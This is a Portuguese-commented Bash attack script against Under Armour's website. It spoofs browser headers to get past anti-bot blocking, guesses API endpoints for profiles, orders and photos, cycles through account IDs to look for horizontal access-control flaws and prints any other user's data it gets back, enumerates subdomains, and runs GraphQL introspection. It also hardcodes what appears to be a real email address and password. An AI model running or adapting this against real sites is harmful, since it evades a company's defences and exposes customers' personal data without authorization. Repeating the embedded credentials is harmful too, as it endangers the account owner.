#!/bin/bash
# Script para contornar proteção anti-bot da Under Armour

BASE_URL="https://www.underarmour.com"
EMAIL="pedroocferreira@gmail.com"
PASSWORD="@Pedro9cce22f2"

echo "🕵️ Testando com técnicas de evasão anti-bot..."

# Headers para simular navegador real
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# Função para testar com headers diferentes
test_with_headers() {
    local endpoint="$1"
    local user_agent="$2"
    
    echo "Testando: $endpoint com UA: ${user_agent:0:50}..."
    
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "User-Agent: $user_agent" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.5" \
        -H "Accept-Encoding: gzip, deflate" \
        -H "Connection: keep-alive" \
        -H "Upgrade-Insecure-Requests: 1" \
        -H "Sec-Fetch-Dest: document" \
        -H "Sec-Fetch-Mode: navigate" \
        -H "Sec-Fetch-Site: none" \
        -H "Cache-Control: max-age=0" \
        "$BASE_URL$endpoint")
    
    echo "  Resposta: $response"
    
    if [ "$response" = "200" ]; then
        echo "  ✅ SUCESSO! Endpoint acessível: $endpoint"
        return 0
    elif [ "$response" = "418" ]; then
        echo "  🚫 Ainda bloqueado (418)"
        return 1
    else
        echo "  ⚠️  Resposta inesperada: $response"
        return 1
    fi
}

# Testar endpoints principais com diferentes User-Agents
ENDPOINTS=(
    "/api/user/profile"
    "/api/profile"
    "/api/athlete"
    "/api/workouts"
    "/api/orders"
    "/api/photos"
    "/api/user"
    "/api/me"
    "/api/account"
)

echo "🔍 Testando endpoints com evasão anti-bot..."

for endpoint in "${ENDPOINTS[@]}"; do
    echo "--- Testando $endpoint ---"
    
    for user_agent in "${USER_AGENTS[@]}"; do
        if test_with_headers "$endpoint" "$user_agent"; then
            echo "🎯 Endpoint descoberto: $endpoint"
            
            # Testar BAC Horizontal no endpoint descoberto
            echo "🔍 Testando BAC Horizontal..."
            for id in 1 2 3 999; do
                test_url="$BASE_URL$endpoint?id=$id"
                echo "  Testando ID $id: $test_url"
                
                bac_response=$(curl -s -o /dev/null -w "%{http_code}" \
                    -H "User-Agent: $user_agent" \
                    -H "Accept: application/json" \
                    "$test_url")
                
                if [ "$bac_response" = "200" ]; then
                    echo "  🚨 POSSÍVEL BAC HORIZONTAL! ID $id acessível"
                    curl -s -H "User-Agent: $user_agent" \
                        -H "Accept: application/json" \
                        "$test_url" | jq . | head -10
                fi
            done
            break
        fi
    done
done

echo ""
echo "🌐 Testando subdomínios alternativos..."

# Testar subdomínios alternativos
SUBDOMAINS=(
    "shop.underarmour.com"
    "api.underarmour.com"
    "app.underarmour.com"
    "mobile.underarmour.com"
    "m.underarmour.com"
    "www.underarmour.co.uk"
    "api.shop.ua.com"
    "developer.underarmour.com"
)

for subdomain in "${SUBDOMAINS[@]}"; do
    echo "Testando subdomínio: $subdomain"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "User-Agent: ${USER_AGENTS[0]}" \
        "https://$subdomain")
    
    if [ "$response" = "200" ]; then
        echo "✅ Subdomínio ativo: $subdomain"
        
        # Testar endpoints no subdomínio
        for endpoint in "/api/user" "/api/profile" "/api/athlete"; do
            test_url="https://$subdomain$endpoint"
            echo "  Testando: $test_url"
            
            endpoint_response=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "User-Agent: ${USER_AGENTS[0]}" \
                "$test_url")
            
            if [ "$endpoint_response" = "200" ]; then
                echo "  🎯 Endpoint ativo: $test_url"
            fi
        done
    else
        echo "❌ Subdomínio inativo: $subdomain (HTTP $response)"
    fi
done

echo ""
echo "🔍 Testando GraphQL endpoint específico..."

# Testar endpoint GraphQL específico mencionado no guia
GRAPHQL_URL="https://api.shop.ua.com/graphql"

echo "Testando GraphQL: $GRAPHQL_URL"

graphql_response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "User-Agent: ${USER_AGENTS[0]}" \
    -H "Content-Type: application/json" \
    "$GRAPHQL_URL")

if [ "$graphql_response" = "200" ]; then
    echo "✅ GraphQL endpoint ativo!"
    
    # Testar introspection query
    echo "🔍 Testando introspection query..."
    
    introspection_query='{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}'
    
    curl -s -X POST "$GRAPHQL_URL" \
        -H "User-Agent: ${USER_AGENTS[0]}" \
        -H "Content-Type: application/json" \
        -d "$introspection_query" | jq . | head -20
    
else
    echo "❌ GraphQL endpoint inativo (HTTP $graphql_response)"
fi

echo ""
echo "🎯 Teste de evasão concluído!"
echo "📋 Próximos passos:"
echo "  1. Analisar endpoints descobertos"
echo "  2. Testar BAC Horizontal nos endpoints ativos"
echo "  3. Focar no GraphQL se disponível"
echo "  4. Usar navegador para testes manuais"
